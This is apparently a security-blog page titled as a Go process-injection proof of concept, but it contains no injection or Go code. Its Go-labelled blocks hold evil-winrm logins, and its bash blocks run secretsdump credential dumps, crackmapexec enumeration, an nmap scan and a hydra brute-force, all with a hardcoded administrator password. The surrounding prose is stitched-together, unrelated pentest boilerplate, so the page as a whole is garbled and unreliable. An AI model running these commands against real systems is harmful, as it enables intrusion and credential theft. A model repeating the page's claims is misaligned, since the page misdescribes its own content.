---
TitleSEO: "Process Injection PoC in Go | ZureFX"
TitlePost: "Process Injection PoC — Go"
Author: "ZureFX"
Description: "A Go script for process injection poc. Built for security research and automation."
Keywords: "powershell, go, fuzzer, rust, parser"
URL: "https://zurefx.github.io/scripting/script-process-injection-poc-460.html"
URL_IMAGES: ""
Date: "2025-12-18"
Tags: "PowerShell, Go, Fuzzer, Rust, Parser"
Section: "scripting"
Lang: "en"
main_img: "script-process-injection-poc-460"
Permalink: "/scripting/script-process-injection-poc-460.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `dcomexec`
- `kerbrute`
- `GetUserSPNs`

## Implementation

### Core Logic

Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

```go
evil-winrm -i 10.35.137.5 -u administrator -p 'P@ssw0rd!'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation.

### Helper Functions

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

```go
evil-winrm -i 10.51.154.172 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.209.2
impacket-secretsdump administrator:'P@ssw0rd!'@10.114.229.214
nmap -sCV -p3268,3268,23 10.94.80.186 -oN scan.txt
feroxbuster -h
```

### Advanced Options

Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
crackmapexec smb 10.91.138.208 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.14.41.65
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.14.50.11 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory.

```
[+] Scanning target...
[+] Found 13 results
[+] Done in 10.21s
```
